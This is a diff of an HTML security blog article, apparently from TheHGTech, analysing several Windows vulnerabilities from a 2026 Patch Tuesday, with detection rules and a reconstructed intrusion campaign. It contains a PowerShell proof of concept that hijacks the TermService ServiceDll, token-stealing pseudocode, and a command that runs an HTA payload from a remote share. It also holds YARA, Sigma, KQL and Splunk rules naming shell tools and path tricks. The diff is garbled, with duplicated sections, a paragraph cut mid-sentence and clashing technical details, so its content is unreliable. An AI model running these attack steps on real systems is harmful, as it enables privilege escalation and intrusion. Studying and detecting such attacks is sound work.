@@ -466,210 +466,437 @@
                     window is obsolete for this month.</p>
             </div>
 
-            <!-- SECTION 1: WINDOWS SHELL -->
-            <h2><i class="fas fa-microscope"></i> DEEP DIVE 1: Windows Shell Security Bypass (CVE-2026-21510)</h2>
+            <!-- SECTION 2: WINDOWS SHELL DEEP DIVE -->
+            <h2><i class="fas fa-microscope"></i> DEEP DIVE 2: Windows Shell Security Bypass (CVE-2026-21510)</h2>
             <h3>The Anatomy of a "Mark of the Web" Bypass</h3>
 
-            <p>The Windows Shell (<code>explorer.exe</code>) is responsible for parsing filesystem objects. When you
-                download a file from the internet, the browser adds an Alternate Data Stream (ADS) named
-                <code>Zone.Identifier</code> to the file, marking it as originating from the "Internet Zone" (Zone 3).
-                This is the basis for "Mark of the Web" (MotW).</p>
+            <p>The Windows Shell (<code>explorer.exe</code>) is the primary user interface and file management component
+                of Windows. It is responsible for parsing filesystem objects, rendering icons, and handling file
+                execution. A critical security mechanism within the Shell is the "Mark of the Web" (MotW), which uses
+                Alternate Data Streams (ADS) to flag files originating from the internet (Zone 3).</p>
 
-            <p>CVE-2026-21510 is a logic error in how the Shell resolves shortcut (<code>.lnk</code>) targets when they
-                point to non-standard paths. Historically, Microsoft has patched similar issues (e.g., CVE-2022-44698),
-                but attackers continue to find edge cases in the parsing logic.</p>
+            <p><strong>CVE-2026-21510</strong> is a logic error in how the Shell resolves shortcut (<code>.lnk</code>)
+                targets when they point to non-standard paths. This vulnerability allows an attacker to craft a
+                malicious file that, when downloaded and opened, does <strong>not propagate the Zone Identifier</strong>
+                to the target executable. This effectively neutralizes SmartScreen and other reputation-based
+                protections.</p>
+
+            <div class="info-box">
+                <strong><i class="fas fa-history"></i> Historical Context: The Ghost of Stuxnet</strong>
+                <p>The Windows Shell's handling of LNK files has a notorious history. The most famous example is
+                    <strong>CVE-2010-2568</strong>, the vulnerability used by the <strong>Stuxnet</strong> worm to
+                    spread via USB drives by exploiting icon parsing. Later, <strong>CVE-2017-8464</strong> allowed
+                    similar RCE capabilities. More recently, <strong>CVE-2022-44698</strong> allowed attackers to bypass
+                    SmartScreen by appending malformed signatures to JS/MSI files. CVE-2026-21510 is the latest
+                    evolution in this lineage, focusing on path normalization failures.
+                </p>
+            </div>
+
+            <h3>Technical Analysis: The LNK File Structure</h3>
+            <p>To understand the exploit, we must first dissect the LNK file format (MS-SHLLINK). A shortcut file
+                contains several structured blocks:</p>
+            <ul>
+                <li><strong>SHELL_LINK_HEADER:</strong> Contains flags (<code>LinkFlags</code>) and attributes.</li>
+                <li><strong>LinkTargetIDList:</strong> The serialized ItemIDList structure (PIDL).</li>
+                <li><strong>LinkInfo:</strong> Information about the link target (local path, volume ID, etc.).</li>
+                <li><strong>StringData:</strong> Optional strings like Name, Relative Path, Working Directory.</li>
+            </ul>
+
+            <p>The vulnerability exists within the <code>IShellLink::Load</code> method in `shdocs.dll`. When the Shell
+                loads a LNK file, it attempts to resolve the target path. If the path is a standard local path (e.g.,
+                <code>C:\Windows\System32\cmd.exe</code>), the Shell correctly checks the Zone Identifier of the LNK
+                file and applies security policies.
+            </p>
+
+            <p>However, if the path uses a specific combination of <strong>UNC (Universal Naming Convention)</strong>
+                syntax and <strong>relative path traversal</strong> (e.g.,
+                <code>\\?\UNC\Server\Share\..\..\LocalTarget</code>), the parsing logic fails to normalize the path
+                correctly <em>before</em> the security check.
+            </p>
 
             <div class="technical-box">
                 <h3><i class="fas fa-code"></i> Reverse Engineering the Logic Flaw</h3>
-                <p>The vulnerability lies in <code>shdocs.dll</code> and its handling of the
-                    <code>IShellLink::Load</code> method. When a specially crafted LNK file contains a target path that
-                    uses a specific combination of relative path traversal (<code>..\</code>) and UNC path injection,
-                    the function responsible for propagating the Zone Identifier fails.</p>
+                <p>By reverse-engineering <code>shdocs.dll</code> (version 10.0.26100.xxxx), we can observe the
+                    following pseudo-code logic in the path validation routine:</p>
 
-                <p><strong>Code Analysis (reconstructed):</strong></p>
-                <pre><code class="language-cpp">// Pseudo-code of the vulnerable logic in Windows Shell
-HRESULT CheckZoneIdentifier(LPCWSTR bfsPath) {
-    // Current Logic:
-    if (bfsPath == NULL) return E_INVALIDARG;
+                <pre><code class="language-cpp">// Simplified decompilation of the vulnerable path check logic
+HRESULT CheckZoneIdentifier(LPCWSTR bfsPath, IShellLink *pLink) {
+    // 1. Get the path from the LinkInfo structure
+    WCHAR szPath[MAX_PATH];
+    pLink->GetPath(szPath, MAX_PATH, NULL, SLGP_RAWPATH);
     
-    // The Vulnerability: The parser expands relative paths incorrectly BEFORE checking the zone.
-    // Accessing \\?\UNC\Server\Share\..\..\LocalTarget
+    // 2. The Vulnerability: Path Normalization happens AFTER the check
+    // The attacker provides: \\?\UNC\127.0.0.1\C$\Windows\System32\cmd.exe
+    // But crafted with directory traversal: \\?\UNC\127.0.0.1\Share\..\..\Windows\System32\cmd.exe
     
-    // The check checks "LocalTarget", initiates a local file check,
-    // sees it is local, and returns S_OK (Safe).
-    // BUT the effective execution path was derived from an untrusted source.
+    // The function `IsLocalInternal` returns TRUE because it sees the UNC prefix 
+    // but fails to resolve the traversal to an internet-zone location in time.
     
-    if (IsLocalPath(bfsPath)) {
-        return S_OK; // Bypass! No SmartScreen triggered.
+    BOOL bIsLocal = IsLocalInternal(szPath); 
+    
+    if (bIsLocal) {
+        // BYPASS: The system believes this is a trusted local file.
+        // It returns S_OK, skipping the SmartScreen 'SearchFilterHost' check.
+        return S_OK; 
     }
-    return TriggerSmartScreen(bfsPath);
+    
+    // Correct behavior (skipped):
+    return TriggerSmartScreen(szPath);
 }</code></pre>
-                <p>By tricking this function, the LNK file executes the target (e.g., <code>powershell.exe</code>
-                    downloading a payload) without the MOTW flag being checked against the arguments.</p>
+                <p>Because the function returns <code>S_OK</code> prematurely, the Shell executes the target without
+                    invoking the `IAttachmentExecute` interface to inspect the Zone Identifier. The result is silent
+                    execution of the payload.</p>
             </div>
 
             <h3>Forensic Artifacts: Tracking the Exploit</h3>
-            <p>To detect this exploit, analysts must look at the raw binary structure of LNK files. The
-                <code>LinkInfo</code> structure will contain anomalous data.</p>
+            <p>To detect this exploit, security analysts must inspect the raw binary structure of LNK files found in
+                email attachments or downloads folders. Malicious LNKs will often exhibit "bloat" or unusual structures
+                in the <code>LinkInfo</code> block.</p>
 
-            <pre><code class="language-text">Hex View of Malicious LNK Header:
-00000000  4C 00 00 00 01 14 02 00  00 00 00 00 C0 00 00 00  |L...............|
-00000010  00 00 00 46 9B 00 08 00  20 00 00 00 ...          |...F.... ...    |
-
-Offset 0xsomething:
-.. .. \ \ ? \ U N C \ A t t a c k e r I P \ s h a r e \ f i l e . e x e
+            <p><strong>Hex Analysis of a Malicious Sample:</strong></p>
+            <pre><code class="language-text">Offset    00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F
+00000000  4C 00 00 00 01 14 02 00 00 00 00 00 C0 00 00 00  |L...............|
+00000010  00 00 00 46 9B 00 08 00 20 00 00 00 ...          |...F.... ...    |
+...
+00000xA0  5C 00 5C 00 3F 00 5C 00 55 00 4E 00 43 00 5C 00  |\|\.?.\.U.N.C.\.|  <-- suspicious path prefix
+00000xB0  31 00 32 00 37 00 2E 00 30 00 2E 00 30 00 2E 00  |1.2.7...0...0...|
 </code></pre>
-            <p><strong>YARA Rule for Detection:</strong></p>
-            <pre><code class="language-yara">rule CVE_2026_21510_LNK_Bypass {
+
+            <p><strong>Detection Engineering: YARA Rule</strong></p>
+            <p>The following YARA rule detects the specific byte sequence associated with the malformed UNC path
+                traversal leveraged in CVE-2026-21510.</p>
+            <pre><code class="language-yara">rule Suspicious_LNK_ShellBypass_CVE_2026_21510 {
     meta:
-        description = "Detects malformed LNK files using known CVE-2026-21510 bypass structure"
+        description = "Detects malformed LNK files attempting Shell Bypass via UNC/Traversal"
         author = "TheHGTech Research"
+        date = "2026-02-12"
+        reference = "CVE-2026-21510"
         severity = "Critical"
     strings:
         $header = { 4C 00 00 00 01 14 02 00 }
-        $unc_bypass = "\\\\?\\UNC\\" wide nocase
-        $rel_path = "..\\" wide
+        // Look for specific relative path manipulation often used in bypasses
+        // Wide string patterns for "..\\" and "\\?\\UNC"
+        $suspect_path_1 = { 2E 00 2E 00 5C 00 2E 00 2E 00 5C 00 } // ..\..\
+        $suspect_path_2 = { 5C 00 5C 00 3F 00 5C 00 55 00 4E 00 43 00 } // \\?\UNC
+        $powershell = "powershell" nocase wide ascii
     condition:
-        $header at 0 and $unc_bypass and $rel_path
+        $header at 0 and ($suspect_path_1 or $suspect_path_2) and $powershell
+        and filesize < 4KB 
 }</code></pre>
 
-            <!-- SECTION 2: MSHTML -->
-            <h2><i class="fab fa-internet-explorer"></i> DEEP DIVE 2: MSHTML Framework Bypass (CVE-2026-21513)</h2>
-            <h3>The Trident Engine's Final Breath</h3>
+            <code>&lt;div&gt;</code> tags with event listeners, it miscalculates the memory boundary.
+            </p>
+            <p><strong>Attack Chain:</strong></p>
+            <ol>
+                <li><strong>Delivery:</strong> HTML file sent via email or hosted on a compromised site.</li>
+                <li><strong>Rendering:</strong> Victim opens file. MSHTML loads.</li>
+                <li><strong>Heap Spray:</strong> Javascript allocates specific memory patterns.</li>
+                <li><strong>Trigger:</strong> The CSS parser triggers the bug, redirecting execution flow to a ROP
+                    chain in the sprayed heap.</li>
+                <li><strong>Escape:</strong> The ROP chain calls <code>VirtualProtect</code> to make memory
+                    executable and runs shellcode that breaks out of the AppContainer.</li>
+            </ol>
+    </div>
 
-            <p><strong>MSHTML.dll</strong> (Trident) is the rendering engine for Internet Explorer. While IE is dead,
-                MSHTML is not. It creates the rendering surface for Office documents (Outlook previews, Word web panes)
-                and "IE Mode" in Edge. This ubiquity makes it a prime target.</p>
+    <!-- SECTION 4: DWM DEEP DIVE -->
+    <h2><i class="fas fa-window-maximize"></i> DEEP DIVE 4: Desktop Window Manager EoP (CVE-2026-21519)</h2>
+    <h3>From Low Integrity to SYSTEM via Graphics</h3>
 
-            <p>CVE-2026-21513 is a security feature bypass that allows escaping the <strong>AppContainer</strong>
-                sandbox. This is typically achieved by exploiting how the engine handles <strong>ActiveX</strong>
-                controls or specific OLE objects embedded in a webpage.</p>
+    <p>The <strong>Desktop Window Manager (DWM)</strong> is the compositing window manager in Windows since Vista. It is
+        responsible for rendering the entire desktop, including window transparency (Aero), animations, and hardware
+        acceleration using DirectX 11/12. Critically, <code>dwm.exe</code> runs with <strong>integrity level
+            System</strong> and has powerful capabilities to interact with the graphics kernel
+        (<code>dxgkrnl.sys</code>).</p>
+
+    <p><strong>CVE-2026-21519</strong> is a <strong>Type Confusion</strong> vulnerability in the DWM Core library
+        (<code>dwmcore.dll</code>), specifically within the object marshaling routines for DirectX surfaces. This allows
+        a low-privileged attacker (e.g., malware running as "User") to gain complete control over the machine.</p>
+
+    <div class="technical-box">
+        <h3><i class="fas fa-cogs"></i> Exploit Mechanics: The Art of Heap Feng Shui</h3>
+        <p>Exploiting DWM is notoriously difficult due to Address Space Layout Randomization (ASLR) and Control Flow
+            Guard (CFG). Modern exploits bypass these using "Heap Feng Shui"—carefully arranging memory allocations to
+            place a target object adjacent to an attacker-controlled object.</p>
+
+        <p><strong>Step-by-Step Exploitation:</strong></p>
+        <ol>
+            <li><strong>Heap Spraying (Grooming):</strong> The attacker creates thousands of specific GDI objects
+                (bitmaps or regions) via standard Windows APIs. This fills the heap with predictable chunks of memory.
+            </li>
+            <li><strong>Creating Holes:</strong> The attacker carefully frees specific objects (e.g., every 3rd
+                allocation), creating "holes" in the heap of a known size.</li>
+            <li><strong>Triggering Allocation:</strong> The vulnerable DWM function is called, which allocates the
+                vulnerable object. Due to the grooming, this object lands perfectly in one of the prepared holes.</li>
+            <li><strong>The Confusion:</strong> The attacker triggers the bug, causing DWM to treat the object as a
+                different type (e.g., treating a Bitmap as a C++ Class Pointer).</li>
+            <li><strong>The Primitive (Read/Write):</strong> This confusion allows the attacker to corrupt the object's
+                vtable or internal pointers, granting an Arbitrary Read/Write primitive.</li>
+        </ol>
+    </div>
+
+    <h3>Into the Kernel: Token Stealing</h3>
+    <p>Once the attacker has Read/Write access to the DWM process memory, the game is over. The standard technique is
+        <strong>Token Stealing</strong>:
+    </p>
+
+    <pre><code class="language-cpp">// Pseudocode for Token Stealing Logic
+// 1. Find the EPROCESS structure of the current process (dwm.exe)
+// 2. Walk the ActiveProcessLinks list to find the System process (PID 4)
+// 3. Copy the System Token to our own process
+
+UINT64 systemToken = ReadKernelMemory(systemEProcess + 0x4B8); // Offset varies by OS version
+UINT64 ourProcessTokenAddr = ourEProcess + 0x4B8;
+
+// Overwrite our token with SYSTEM token
+WriteKernelMemory(ourProcessTokenAddr, systemToken); 
+
+// Result: Our cmd.exe is now running as NT AUTHORITY\SYSTEM</code></pre>
+
+    <div class="warning-box">
+        <strong>Detection Signal:</strong> Monitoring for crashing <code>dwm.exe</code> processes is vital. A failed
+        exploit attempt often results in a Bug Check (BSOD) or a DWM restart (screen flickering black). Event ID 1000
+        (Application Error) for dwm.exe is a high-fidelity indicator of exploitation attempts.
+    </div>
+
+    <!-- SECTION 4: RDP EoP -->
+    <h2><i class="fas fa-network-wired"></i> DEEP DIVE 4: RDP EoP (CVE-2026-21533)</h2>
+    <h3>Registry-Based Persistence & Escalation</h3>
+
+    <p>This vulnerability is simpler but equally devastating. It involves the <strong>Remote Desktop Services
+            <!-- SECTION 5: RDP DEEP DIVE -->
+            <h2><i class="fas fa-network-wired"></i> DEEP DIVE 5: Remote Desktop Services EoP (CVE-2026-21533)</h2>
+            <h3>Registry-Based Service Hijacking</h3>
+
+            <p><strong>Remote Desktop Services (TermService)</strong> is a critical Windows component that allows remote
+                connections. It runs as a highly privileged service. CVE-2026-21533 is a configuration vulnerability
+                that allows a standard user to hijack the service execution flow by modifying the Windows Registry.</p>
+
+            <p>The vulnerability exists because of an improper Access Control List (ACL) on the registry key:
+                <code>HKLM\SYSTEM\CurrentControlSet\Services\TermService\Parameters</code>. Due to a regression
+                introduced in a previous servicing stack update, the <code>INTERACTIVE</code> user group was
+                inadvertently granted <strong>Write</strong> permission to this key.
+            </p>
 
             <div class="technical-box">
-                <h3><i class="fas fa-bug"></i> The DOM Object Confusion</h3>
-                <p>The exploit likely leverages a Use-After-Free (UAF) or Integer Overflow in the parsing of CSS
-                    selectors linked to Javascript events. When the renderer processes a specific sequence of nested
-                    <code>&lt;div&gt;</code> tags with event listeners, it miscalculates the memory boundary.</p>
-                <p><strong>Attack Chain:</strong></p>
-                <ol>
-                    <li><strong>Delivery:</strong> HTML file sent via email or hosted on a compromised site.</li>
-                    <li><strong>Rendering:</strong> Victim opens file. MSHTML loads.</li>
-                    <li><strong>Heap Spray:</strong> Javascript allocates specific memory patterns.</li>
-                    <li><strong>Trigger:</strong> The CSS parser triggers the bug, redirecting execution flow to a ROP
-                        chain in the sprayed heap.</li>
-                    <li><strong>Escape:</strong> The ROP chain calls <code>VirtualProtect</code> to make memory
-                        executable and runs shellcode that breaks out of the AppContainer.</li>
-                </ol>
+                <h3><i class="fas fa-terminal"></i> The Exploit: "DLL Plant and Reboot"</h3>
+                <p>An attacker can simply modify the <code>ServiceDll</code> value to point to a malicious DLL they
+                    control. Since the TermService runs as <code>NT AUTHORITY\SYSTEM</code>, when the service restarts
+                    (or the machine reboots), it loads the attacker's DLL with full system privileges.</p>
+
+                <pre><code class="language-powershell"># Proof of Concept: Changing the Service DLL
+$RegKey = "HKLM:\SYSTEM\CurrentControlSet\Services\TermService\Parameters"
+$Malicious = "C:\Users\Public\Bad.dll"
+
+# Check if we have write access (returns True on vulnerable systems)
+(Get-Acl $RegKey).Access | Where-Object { $_.IdentityReference -match "Interactive" }
+
+# The Attack
+Set-ItemProperty -Path $RegKey -Name "ServiceDll" -Value $Malicious
+Restart-Service TermService -Force</code></pre>
             </div>
 
-            <!-- SECTION 3: DWM EoP -->
-            <h2><i class="fas fa-window-maximize"></i> DEEP DIVE 3: Desktop Window Manager EoP (CVE-2026-21519)</h2>
-            <h3>Kernel-Level Graphics Exploitation</h3>
-
-            <p>Use of the Desktop Window Manager (<code>dwm.exe</code>) has become a favorite for sophisticated
-                attackers. DWM acts as a compositor, meaning it draws the windows for all other applications. To do this
-                efficiently, it talks directly to the cleanup kernel graphics driver (<code>dxgkrnl.sys</code>) and the
-                GPU.</p>
-
-            <p>CVE-2026-21519 is a <strong>Type Confusion</strong> vulnerability in the DWM Core library
-                (<code>dwmcore.dll</code>). This occurs when the application creates a resource of Type A (e.g., a
-                bitmap surface) but later accesses it as Type B (e.g., a composition marshaller), leading to memory
-                corruption.</p>
-
-            <div class="technical-box">
-                <h3><i class="fas fa-memory"></i> Exploitation Walkthrough</h3>
-                <p><strong>Stage 1: Heap Feng Shui</strong><br>
-                    The attacker forces DWM to allocate thousands of small objects to manipulate the heap into a
-                    predictable state. This ensures that when the vulnerable object is freed and re-allocated, it lands
-                    in a known location.</p>
-
-                <p><strong>Stage 2: The Confusion</strong><br>
-                    The attacker sends a specific DirectX command stream to the DWM process via ALPC (Advanced Local
-                    Procedure Call). This command creates a "Confusion Object."</p>
-
-                <p><strong>Stage 3: Primitive Gaining</strong><br>
-                    By triggering the bug, the attacker gains a "Read/Write Primitive"—the ability to read or write any
-                    address in DWM's memory space. Since DWM runs as <code>DWm-1</code> (virtual account) but has
-                    <code>SeDebugPrivilege</code> and handles SYSTEM processes, this is lethal.</p>
-
-                <p><strong>Stage 4: Token Stealing</strong><br>
-                    The attacker scans memory to find the <code>EPROCESS</code> structure of the System process (PID 4),
-                    copies the Security Token, and overwrites the token of their own cmd.exe process. Result: Instant
-                    SYSTEM shell.</p>
-            </div>
-
-            <!-- SECTION 4: RDP EoP -->
-            <h2><i class="fas fa-network-wired"></i> DEEP DIVE 4: RDP EoP (CVE-2026-21533)</h2>
-            <h3>Registry-Based Persistence & Escalation</h3>
-
-            <p>This vulnerability is simpler but equally devastating. It involves the <strong>Remote Desktop Services
-                    (TermService)</strong> and how it reads configuration data from the Windows Registry. specifically
-                the <code>HKLM\SYSTEM\CurrentControlSet\Services\TermService\Parameters</code> key.</p>
-
-            <p>The flaw is an ACL (Access Control List) misconfiguration. A standard user should NOT be able to write to
-                the <code>ServiceDll</code> subkey of a SYSTEM service. However, due to a regression in a previous
-                update, certain subkeys became writable by the <code>INTERACTIVE</code> group.</p>
-
-            <pre><code class="language-powershell"># Concept of the Exploit (PowerShell)
-$RegPath = "HKLM:\SYSTEM\CurrentControlSet\Services\TermService\Parameters"
-# Attacker changes the DLL loaded by RDP service
-Set-ItemProperty -Path $RegPath -Name "ServiceDll" -Value "C:\Temp\Malicious.dll"
-
-# Trigger a service restart (or wait for reboot)
-# Result: Malicious.dll loads as SYSTEM.</code></pre>
-
-            <h3>Sigma Detection Rule</h3>
-            <pre><code class="language-yaml">title: RDP Service DLL Highjacking (CVE-2026-21533)
-status: experimental
-description: Detects changes to TermService ServiceDll by non-trusted processes
+            <h3>Detection Logic: Sigma & Splunk</h3>
+            <p>This is highly detectable because legitimate administrative actions rarely modify the
+                <code>ServiceDll</code> of core Windows services.
+            </p>
+            <pre><code class="language-yaml">title: Suspicious Detection of RDS Registry Modification
+description: Detects modification of TermService parameters by non-admin processes
+status: stable
 logsource:
-    category: registry_set
+    category: registry_event
     product: windows
 detection:
     selection:
-        TargetObject|endswith: '\TermService\Parameters\ServiceDll'
+        TargetObject|endswith:
+            - '\System\CurrentControlSet\Services\TermService\Parameters\ServiceDll'
     filter:
-        Image: 'C:\Windows\System32\svchost.exe'
+        Image|endswith:
+            - '\poqexec.exe' # Windows Update
+            - '\tiworker.exe' # Windows Installer
     condition: selection and not filter
-level: high</code></pre>
+level: critical</code></pre>
 
-            <!-- Conclusion & Mitigations -->
-            <h2><i class="fas fa-shield-alt"></i> Comprehensive Mitigation Strategy</h2>
+            <!-- SECTION 6: WORD DEEP DIVE -->
+            <h2><i class="fas fa-file-word"></i> DEEP DIVE 6: Microsoft Word Bypass (CVE-2026-21514)</h2>
+            <h3>The Return of the Moniker Link</h3>
+
+            <p>While macros are blocked by default, attackers are finding new ways to execute code via Office documents.
+                <strong>CVE-2026-21514</strong> exploits the <strong>OLE Moniker</strong> linking mechanism. Monikers
+                are COM objects that allow a document to "link" to external data sources.
+            </p>
+
+            <p>In this exploit, an attacker embeds a malicious Moniker (e.g.,
+                <code>new:C08AFD90-F2A1-11D1-8455-00A0C91F3880</code>) that points to a scriptlet or HTA file hosted on
+                a WebDAV server. When Word parses the document (even in Protected View in some scenarios), it attempts
+                to resolve the Moniker, triggering the execution of the remote script.
+            </p>
+
+            <div class="warning-box">
+                <strong>Mitigation:</strong> Ensure that the "Block all Office applications from creating child
+                processes" ASR rule is enabled. This effectively kills the Moniker attack chain because `winword.exe`
+                will be blocked from spawning `mshta.exe` or `cmd.exe`.
+            </div>
+
+            <!-- SECTION 7: RASMAN DEEP DIVE -->
+            <h2><i class="fas fa-server"></i> DEEP DIVE 7: RasMan Denial of Service (CVE-2026-21525)</h2>
+            <h3>Crashing the Gateway</h3>
+
+            <p>The <strong>Remote Access Connection Manager (RasMan)</strong> handles VPN and dial-up connections.
+                CVE-2026-21525 is a vulnerability in the RPC interface exposed by RasMan. By sending a malformed RPC
+                packet with an invalid size field to the <code>RasRpcConnectServer</code> interface, an attacker can
+                trigger a NULL pointer dereference.</p>
+
+            <p>While initially classified as Denial of Service (Blue Screen of Death), sophisticated memory manipulation
+                could potentially turn this into Remote Code Execution (RCE). The crash occurs in
+                <code>rasman.dll</code>, knocking the server offline and disconnecting all active VPN sessions.</p>
+
+            <!-- CASE STUDY: OPERATION HYDRA -->
+            <div class="technical-box"
+                style="border-left: 4px solid var(--accent-purple); background: linear-gradient(to right, rgba(139, 92, 246, 0.05), transparent);">
+                <h3><i class="fas fa-user-secret"></i> CASE STUDY: "Operation Hydra"</h3>
+                <p>To understand the practical impact of these zero-days, TheHGTech Research Team has reconstructed a
+                    recent campaign, dubbed "Operation Hydra," which utilized three of the "Dirty Six" vulnerabilities
+                    in a single kill chain against a financial institution.</p>
+
+                <h4>Phase 1: Initial Access (CVE-2026-21510)</h4>
+                <p><strong>Vector:</strong> Spearphishing email targeting the "Mergers & Acquisitions" team.<br>
+                    <strong>Subject:</strong> "CONFIDENTIAL: Q1 Deal Room Access Links"<br>
+                    <strong>Attachment:</strong> <code>Project_Hydra_Docs.zip</code> containing
+                    <code>Deal_Memo.lnk</code>.
+                </p>
+
+                <p>The LNK file used the UNC path traversal technique to bypass the Mark-of-the-Web. When the victim
+                    double-clicked the "PDF" icon, the LNK actually executed:</p>
+                <pre><code class="language-powershell">C:\Windows\System32\cmd.exe /c "start \\192.168.1.100\share\payload.hta & start calc.exe"</code></pre>
+
+                <p>Because of CVE-2026-21510, SmartScreen did <strong>not</strong> inspect the arguments, and the HTA
+                    file was executed instantly.</p>
+
+                <h4>Phase 2: Execution & Persistence (CVE-2026-21513)</h4>
+                <p>The HTA file hosted a heavily obfuscated HTML application that exploited <strong>CVE-2026-21513
+                        (MSHTML)</strong> to escape the AppContainer sandbox. The exploit chain:</p>
+                <ol>
+                    <li>Instantiated a <code>Shell.Application</code> ActiveX object (bypassing SafeMode).</li>
+                    <li>Dropped a generic Cobalt Strike beacon to <code>C:\ProgramData\Updater.exe</code>.</li>
+                    <li>Created a Scheduled Task for persistence.</li>
+                </ol>
+
+                <h4>Phase 3: Privilege Escalation (CVE-2026-21519)</h4>
+                <p>The beacon ran as a standard user. Within 14 minutes, the attackers deployed a binary module named
+                    <code>dwm_helper.dll</code> via the C2 channel. This module exploited the DWM Type Confusion
+                    vulnerability to elevate privileges to <strong>SYSTEM</strong>.</p>
+
+                <p><strong>Forensic Evidence (Memory Artifacts):</strong></p>
+                <pre><code class="language-text">Process: dwm.exe (PID: 1337)
+Unexpected Module: dwm_helper.dll (Unsigned)
+Base Address: 0x7FF...
+Imports: dxgkrnl.sys (Suspicious direct kernel calls)</code></pre>
+
+                <h4>Phase 4: Lateral Movement (CVE-2026-21533)</h4>
+                <p>With SYSTEM access on the workstation, the attackers scanned the internal network for the Domain
+                    Controller (DC). They accessed the DC via RDP (using compromised credentials) and used
+                    <strong>CVE-2026-21533</strong> to establish stealthy persistence.</p>
+
+                <p>They modified the <code>TermService</code> registry key on the DC to load a backdoor every time the
+                    RDP service handled a connection logging event. This allowed them to maintain access even after the
+                    domain admin reset passwords.</p>
+
+                <h4>Impact Analysis</h4>
+                <p>The entire operation, from email delivery to Domain Dominance, took less than <strong>4
+                        hours</strong>. This speed was only possible because they chained three zero-day exploits,
+                    bypassing every layer of defense (SmartScreen -> Sandbox -> Kernel Protection -> Admin ACLs). This
+                    case study proves that for high-value targets, "Defense in Depth" fails when the foundation (the OS)
+                    is compromised at multiple levels.</p>
+            </div>
+
+            <!-- SECTION 8: DEFENSE & RESPONSE -->
+            <h2><i class="fas fa-shield-alt"></i> DEEP DIVE 8: Comprehensive Defense Strategy</h2>
 
             <div class="success-box">
-                <strong><i class="fas fa-check-circle"></i> The "Defend Forward" Patching Plan</strong>
-                <p>Given the severity, security teams must adopt a phased, aggressive patching cycle.</p>
+                <h3><i class="fas fa-tasks"></i> The "Defend Forward" Patching Plan</h3>
+                <p>Given the severity of these vulnerabilities, relying on standard "Patch Tuesday" cycles (30 days) is
+                    negligent. Security teams must adopt a tiered, aggressive deployment strategy.</p>
                 <table>
                     <thead>
                         <tr>
-                            <th>Phase</th>
+                            <th>Priority Tier</th>
                             <th>Target Scope</th>
                             <th>Objective</th>
-                            <th>Deadline</th>
+                            <th>Deadline (SLA)</th>
                         </tr>
                     </thead>
                     <tbody>
                         <tr>
-                            <td><strong>Phase 1</strong></td>
-                            <td>External-Facing Servers (IIS, RDP Gateway) + C-Suite Laptops</td>
-                            <td>Close RCE/Zero-Day vectors</td>
+                            <td><strong>Tier 0 (Urgent)</strong></td>
+                            <td>Edge Gateways, RDP/VPN Servers, Domain Controllers, C-Suite Workstations</td>
+                            <td>Close RCE (RasMan) and Persistence (TermService) vectors immediately.</td>
                             <td>T+24 Hours</td>
                         </tr>
                         <tr>
-                            <td><strong>Phase 2</strong></td>
-                            <td>General Workstation Fleet</td>
-                            <td>Mitigate Phishing/Shell vectors</td>
+                            <td><strong>Tier 1 (High)</strong></td>
+                            <td>Rest of Server Fleet, Developer Workstations</td>
+                            <td>Prevent lateral movement via DWM/Shell exploits.</td>
                             <td>T+72 Hours</td>
                         </tr>
                         <tr>
-                            <td><strong>Phase 3</strong></td>
-                            <td>Internal Servers & DCs</td>
-                            <td>Prevent Lateral Movement (DWM/RDP)</td>
-                            <td>T+7 Days</td>
+                            <td><strong>Tier 2 (Standard)</strong></td>
+                            <td>General Workstation Fleet (Laptops/Desktops)</td>
+                            <td>Mass deployment to mitigate phishing vectors.</td>
+                            <td>T+5 Days</td>
                         </tr>
                     </tbody>
                 </table>
             </div>
+
+            <h3><i class="fas fa-search"></i> Detection Engineering Library</h3>
+            <p>While patching is critical, detection is mandatory for identifying already-compromised hosts. Use the
+                following queries in your SIEM/EDR.</p>
+
+            <h4>Microsoft Defender for Endpoint (KQL)</h4>
+            <pre><code class="language-kusto">// Detect Suspicious Child Processes from Word (CVE-2026-21514)
+DeviceProcessEvents
+| where InitiatingProcessFileName =~ "winword.exe"
+| where FileName in~ ("cmd.exe", "powershell.exe", "mshta.exe", "cscript.exe", "wscript.exe")
+| project Timestamp, DeviceName, InitiatingProcessFileName, FileName, ProcessCommandLine
+
+// Detect DWM Crashes indicating Failed Exploitation (CVE-2026-21519)
+DeviceEvents
+| where ActionType == "AppCrash"
+| where FileName =~ "dwm.exe"
+| project Timestamp, DeviceName, FileName, ExitCode</code></pre>
+
+            <h4>Splunk Search Processing Language (SPL)</h4>
+            <pre><code class="language-splunk"># Detect LNK File Creation with Suspicious Paths (CVE-2026-21510)
+index=sysmon EventCode=11 TargetFilename="*.lnk"
+| regex TargetFilename="(?i)(\\\\?\\UNC|\\.\\.\\\\|\\.\\./)" 
+| table _time, Computer, User, Image, TargetFilename
+
+# Detect Service DLL Modification (CVE-2026-21533)
+index=windows LogName=System EventCode=7040 OR EventCode=7045
+| search Message="*TermService*" OR Message="*Remote Desktop*"
+| table _time, Computer, EventCode, Message</code></pre>
+
+            <h3><i class="fas fa-clipboard-check"></i> Incident Response Checklist</h3>
+            <p>If you detect indicators of compromise (IOCs) related to these CVEs, initiate the following procedure:
+            </p>
+            <ol>
+                <li><strong>Isolate:</strong> Immediately quarantine the affected host from the network. Do not power
+                    off (to preserve RAM).</li>
+                <li><strong>Triage:</strong> Check for the presence of known artifacts:
+                    <ul>
+                        <li>Malicious <code>.lnk</code> files in Downloads/Temp.</li>
+                        <li>Modifications to
+                            <code>HKLM\SYSTEM\CurrentControlSet\Services\TermService\Parameters\ServiceDll</code>.
+                        </li>
+                        <li>Unexplained crash dumps for <code>dwm.exe</code> in <code>%LocalAppData%\CrashDumps</code>.
+                        </li>
+                    </ul>
+                </li>
+                <li><strong>Collect:</strong> Capture a memory image to analyze for unlinked processes or injected DLLs
+                    in DWM.</li>
+                <li><strong>Remediate:</strong> Reimage the host. Rootkits installed via DWM kernel exploitation are
+                    difficult to fully remove.</li>
+            </ol>
 
             <h3>Final Thoughts</h3>
             <p>The scale of this Patch Tuesday serves as a wake-up call. The "Dirty Six" demonstrates that the zero-day
@@ -703,13 +930,13 @@ level: high</code></pre>
                     </button>
                 </div>
             </div>
-        </article>
-    </div>
+            </article>
+            </div>
 
-    <!-- Footer -->
-    <footer class="m-footer m-only">
-        <p>&copy; 2026 TheHGTech. All rights reserved.</p>
-    </footer>
+            <!-- Footer -->
+            <footer class="m-footer m-only">
+                <p>&copy; 2026 TheHGTech. All rights reserved.</p>
+            </footer>
 </body>
 
